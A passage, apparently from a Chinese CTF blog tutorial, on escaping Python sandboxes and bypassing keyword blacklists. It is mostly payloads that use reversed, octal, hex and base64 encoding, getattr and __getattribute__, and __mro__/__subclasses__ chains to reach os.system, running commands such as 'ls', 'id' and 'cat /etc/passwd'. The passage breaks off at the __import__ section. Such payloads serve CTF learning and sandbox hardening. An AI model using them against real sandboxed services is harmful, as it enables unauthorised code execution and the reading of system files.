&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;)&amp;quot;imaohw&amp;quot;(metsys.)&amp;quot;so&amp;quot;(__tropmi__&amp;#x27;&lt;/span&gt;[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kali&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;)&amp;quot;imaohw&amp;quot;(metsys.so ;so tropmi&amp;#x27;&lt;/span&gt;[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kali&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;注意 exec 与 eval 在执行上有所差异。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;eval&lt;/code&gt;  函数用于计算传递给它的 Python 表达式，并返回结果。它通常用于&lt;strong&gt;执行单一表达式&lt;/strong&gt;，并将其结果赋值给变量。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;exec&lt;/code&gt;  函数用于执行包含 Python 代码块的字符串。它通常用于&lt;strong&gt;执行多行代码&lt;/strong&gt;，而不返回任何结果。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&#34;进制转换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#进制转换&#34;&gt;#&lt;/a&gt; 进制转换&lt;/h5&gt;
&lt;p&gt;八进制：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;print(&amp;#x27;RCE&amp;#x27;); __import__(&amp;#x27;os&amp;#x27;).system(&amp;#x27;ls&amp;#x27;)&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;s = &lt;span class=&#34;string&#34;&gt;&amp;quot;eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False])&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;octal_string = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;.join([&lt;span class=&#34;string&#34;&gt;f&amp;quot;\\&lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;oct&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(c))[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:]&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; c &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; s])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(octal_string)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;十六进制：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;s = &lt;span class=&#34;string&#34;&gt;&amp;quot;eval(eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False]))&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;octal_string = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;.join([&lt;span class=&#34;string&#34;&gt;f&amp;quot;\\x&lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(c))[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:]&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; c &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; s])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(octal_string)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;其他编码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#其他编码&#34;&gt;#&lt;/a&gt; 其他编码&lt;/h5&gt;
&lt;p&gt;hex、rot13、base32 等。&lt;/p&gt;
&lt;h4 id=&#34;过滤了属性名或者函数名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤了属性名或者函数名&#34;&gt;#&lt;/a&gt; 过滤了属性名或者函数名&lt;/h4&gt;
&lt;p&gt;在 payload 的构造中，我们大量的使用了各种类中的属性，例如  &lt;code&gt;__class__&lt;/code&gt; 、 &lt;code&gt;__import__&lt;/code&gt;  等。&lt;/p&gt;
&lt;h5 id=&#34;getattr-函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#getattr-函数&#34;&gt;#&lt;/a&gt; getattr 函数&lt;/h5&gt;
&lt;p&gt;getattr 是 python 的内置函数，用于获取对象的属性或方法，其语法如下：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;getattr&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;object&lt;/span&gt;,name[,default])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;这里，object 是对象，name 是字符串，代表要获取的属性的名称。如果提供了 default 参数，当属性不存在时会返回这个值，否则会抛出 AttributeError。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;getattr&lt;/span&gt;(&amp;#123;&amp;#125;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;__class__&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;dict&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;getattr&lt;/span&gt;(os,&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;built-&lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; function system&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;getattr&lt;/span&gt;(os,&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;)(&lt;span class=&#34;string&#34;&gt;&amp;#x27;cat /etc/passwd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root:x:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:root:/root:/usr/&lt;span class=&#34;built_in&#34;&gt;bin&lt;/span&gt;/zsh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;getattr&lt;/span&gt;(os,&lt;span class=&#34;string&#34;&gt;&amp;#x27;system111&amp;#x27;&lt;/span&gt;,os.system)(&lt;span class=&#34;string&#34;&gt;&amp;#x27;cat /etc/passwd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root:x:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:root:/root:/usr/&lt;span class=&#34;built_in&#34;&gt;bin&lt;/span&gt;/zsh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;这样一来，就可以将 payload 中的属性名转化为字符串，字符串的变换方式多种多样，更易于绕过黑名单。&lt;/p&gt;
&lt;h5 id=&#34;__getattribute__-函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#__getattribute__-函数&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__getattribute__&lt;/code&gt;  函数&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;__getattribute__&lt;/code&gt;  于，它定义了当我们尝试获取一个对象的属性时应该进行的操作。&lt;/p&gt;
&lt;p&gt;它的基本语法如下：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;MyClass&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__getattribute__&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, name&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;getattr 函数在调用时，实际上就是调用这个类的  &lt;code&gt;__getattribute__&lt;/code&gt;  方法。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;os.__getattribute__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;method-wrapper &lt;span class=&#34;string&#34;&gt;&amp;#x27;__getattribute__&amp;#x27;&lt;/span&gt; of module &lt;span class=&#34;built_in&#34;&gt;object&lt;/span&gt; at &lt;span class=&#34;number&#34;&gt;0x7f06a9bf44f0&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;os.__getattribute__(&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;built-&lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; function system&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;__getattr__-函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#__getattr__-函数&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__getattr__&lt;/code&gt;  函数&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;__getattr__&lt;/code&gt;  是 Python 的一个特殊方法，当尝试访问一个对象的不存在的属性时，它就会被调用。它允许一个对象动态地返回一个属性值，或者抛出一个  &lt;code&gt;AttributeError&lt;/code&gt;  异常。&lt;/p&gt;
&lt;p&gt;如下是  &lt;code&gt;__getattr__&lt;/code&gt;  方法的基本形式：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;MyClass&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__getattr__&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, name&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;You tried to get &amp;#x27;&lt;/span&gt; + name&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;在这个例子中，任何你尝试访问的不存在的属性都会返回一个字符串，形如 “You tried to get X”，其中 X 是你尝试访问的属性名。&lt;/p&gt;
&lt;p&gt;与  &lt;code&gt;__getattribute__&lt;/code&gt;  不同， &lt;code&gt;__getattr__&lt;/code&gt;  只有在&lt;strong&gt;属性查找失败&lt;/strong&gt;时才会被调用，这使得  &lt;code&gt;__getattribute__&lt;/code&gt;  可以用来更为全面地控制属性访问。&lt;/p&gt;
&lt;p&gt;如果在一个类中同时定义了  &lt;code&gt;__getattr__&lt;/code&gt;  和  &lt;code&gt;__getattribute__&lt;/code&gt; ，那么无论属性是否存在， &lt;code&gt;__getattribute__&lt;/code&gt;  都会被首先调用。只有当  &lt;code&gt;__getattribute__&lt;/code&gt;  抛出  &lt;code&gt;AttributeError&lt;/code&gt;  异常时， &lt;code&gt;__getattr__&lt;/code&gt;  才会被调用。&lt;/p&gt;
&lt;p&gt;另外，所有的类都会有 &lt;code&gt;__getattribute__&lt;/code&gt; 属性，而不一定有 &lt;code&gt;__getattr__&lt;/code&gt; 属性。&lt;/p&gt;
&lt;h5 id=&#34;__globals__-替换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#__globals__-替换&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__globals__&lt;/code&gt;  替换&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;__globals__&lt;/code&gt;  可以用 func_globals 直接替换；&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__mro__[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;].__subclasses__()[&lt;span class=&#34;number&#34;&gt;59&lt;/span&gt;].__init__.__globals__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__mro__[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;].__subclasses__()[&lt;span class=&#34;number&#34;&gt;59&lt;/span&gt;].__init__.func_globals&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__mro__[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;].__subclasses__()[&lt;span class=&#34;number&#34;&gt;59&lt;/span&gt;].__init__.__getattribute__(&lt;span class=&#34;string&#34;&gt;&amp;quot;__glo&amp;quot;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;quot;bals__&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;__mro__-__bases__-__base__互换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#__mro__-__bases__-__base__互换&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__mro__&lt;/code&gt; 、 &lt;code&gt;__bases__&lt;/code&gt; 、 &lt;code&gt;__base__&lt;/code&gt; 互换&lt;/h5&gt;
&lt;p&gt;三者之间可以相互替换&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__mro__[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__mro__[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#125;.__class__.__mro__[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__mro__[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__mro__[-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#125;.__class__.__mro__[-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__mro__[-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#125;.__class__.__bases__[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__bases__[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__bases__[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__base__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__base__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#125;.__class__.__base__&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;过滤-import&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤-import&#34;&gt;#&lt;/a&gt; 过滤 import&lt;/h4&gt;
&lt;p&gt;python 中除了可以使用 import 来导入，还可以使用  &lt;code&gt;__import__&lt;/code&gt;  和  &lt;code&gt;importlib.import_module&lt;/code&gt;  来导入模块&lt;/p&gt;
&lt;h5 id=&#34;__import__&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#__import__&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__import__&lt;/code&gt;&lt;/h5&gt;
